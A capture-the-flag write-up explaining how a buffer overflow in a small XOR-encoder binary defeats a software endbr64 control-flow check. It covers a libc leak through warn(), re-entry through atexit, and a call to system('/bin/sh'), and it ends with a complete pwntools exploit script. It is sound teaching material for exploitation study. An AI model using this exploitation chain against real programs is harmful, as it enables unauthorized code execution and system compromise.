This challenge is a simple XOR encoder: it reads a key and a message, both 32-byte strings, XORs them together and prints the result.
Example:
```
[KEY] 888
[MSG] nop
[OUT] VWH
```

The key and the message are stored in a struct with some error-handling features:
```c
struct {
	char key[32];
	char buf[32];
	const char* error;
	int status;
	void (*throw)(int, const char*, ...);
} ctx_t;
```

When an error occurs `error` is set to a relevant message, `status` is set to `EXIT_FAILURE`, a check is performed on `throw()` to prevent it from derailing control flow, and then it is called with `error` and `status` as parameters.

For example, here's how reading input from the user is implemented:
```c
void read_member(ctx_t *ctx, off_t offset, size_t size) {
	if (read(STDIN_FILENO, (void*)ctx + offset, size) <= 0) {
		ctx->status = EXIT_FAILURE;
		ctx->error = "I/O Error";
	}
	
	ctx->buf[strcspn(ctx->buf, "\n")] = '\0';
	
	if (ctx->status != 0) {
		CFI(ctx->throw)(ctx->status, ctx->error);
	}
}
```

I had never seen the type `off_t` before, it's used here to choose which field of the `ctx_t` struct to read; it just indicates the field's offset (for example, `buf`'s offset is 32).

The control-flow check performed on `throw()` is implemented as a macro `CFI` that we can see being used in the failure branch, this is what the macro looks like:
```c
#define INSN_ENDBR64 (0xF30F1EFA) /* endbr64 */
#define CFI(f) \
	({ \
		if (__builtin_bswap32(*(uint32_t*)(f)) != INSN_ENDBR64) \
			__builtin_trap(); \
		(f); \
	})
```

This is just a weird way to check that the first assembly instruction of `throw()` is `endbr64`, and crash the process if it isn't.

By googling a bit I learned about CET (Control-Flow Enforcement Technology) and CFI (Control-Flow Integrity), which are security measures used to prevent control-flow corruption techniques like ROP chains.
Put simply, if we mark the start of functions with `endbr64`, when performing a call on a function pointer (like  `throw()`) if we find that we're not jumping to an `endbr64`, we know we're performing an invalid jump, and that there has been an attempt to corrupt the control flow.
These checks are performed by the CPU and only work if the CPU, the OS, libraries, and the program itself all support and use CET; this program implements a software CET instead.

Looking at when the user input is read, we can see we have 2 buffer overflows:
```c
int main() {
	ctx_t ctx = { .error = NULL, .status = 0, .throw = err };
	
	read_member(&ctx, offsetof(ctx_t, key), sizeof(ctx));
	read_member(&ctx, offsetof(ctx_t, buf), sizeof(ctx)); // definitely OOB!
	
	encrypt(&ctx);
	write(STDOUT_FILENO, ctx.buf, KEY_SIZE);
	
	return 0;
}
```

It's reading `sizeof(ctx)` bytes instead of `sizeof(key)` and `sizeof(buf)` (both are 32 bytes). We're able to first overwrite the whole `ctx` struct, and then also overwrite 32 bytes outside of it and into main's frame pointer, though this isn't very useful since there's the canary.

Since we can overwrite `throw()`, we have an arbitrary call with 2 controlled parameters, but we have no leaks; the binary isn't PIE, but we're limited to functions starting with `endbr64`, and there aren't any useful ones in the binary itself.

We can leak the libc by setting `error` to a GOT entry, but `err()` also calls `exit()`; we need some way to leak the libc without also crashing..
We can achieve this via a partial overwrite, and by looking at `endbr64` occurrences near `err()`, i found `warn()`, which behaves like `printf()`.

So with my first payload, I'll set the status to a GOT entry (it's then passed as the first parameter to `throw()`), and overwrite the lower bytes of `throw()` to point to `warn()`.

Now `read_member()` is called again, and I can call any libc function I want.
I can't call one_gadgets because they don't start with `endbr64`, and I can't call `system()` because the first parameter must be a pointer to "/bin/sh", but it's nowhere in the binary's memory, and since `status` is an int I can only pass a 4-byte number, and libc addresses are much bigger than that.

I wasn't able to find a way to spawn a shell or read the flag from here, so I tried to find ways to jump to main again, which I can't do directly because it doesn't start with `endbr64` (`_init()` does, but it checks if it's already been called once, and if so doesn't start main).

What I ended up doing is calling `atexit()` to register `main()` as an exit handler, which means that before closing the program, `main()` will be called again, and I can perform a second stage of my attack, in which I first call `gets()` to read "/bin/sh" into memory, and then `system()` using this address.


Here's the final exploit:
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./xor")
libc = ELF("./libc.so.6")

context.binary = exe


io = process("./xor")

# leak libc by printing a GOT entry via a partial overwrite (throw goes from err() to warn())
payload = b'\n' + b'A'*63 + p64(exe.got["err"])*2 + b"\x10\x10"
io.send(payload)

io.recvuntil(b": ")
leak = u64(io.recv(6).ljust(8, b'\0'))
libc.address = leak - libc.sym["err"]
log.info(f"libc @ {hex(libc.address)}")

payload = b'\n' + b'A'*31 + flat(1, exe.sym["main"], libc.sym["__cxa_atexit"])
io.send(payload)
log.info("Registered main as an exit handler, starting again")

# read '/bin/sh' into memory so we can use it to call system()
payload = b'\n' + b'A'*63 + flat(1, exe.bss(0x100), libc.sym["gets"])
io.send(payload)
io.sendline(b"/bin/sh")

# finally, call system()
payload = b'\n' + b'A'*31 + flat(1, exe.bss(0x100), libc.sym["system"])
io.send(payload)

io.interactive()
```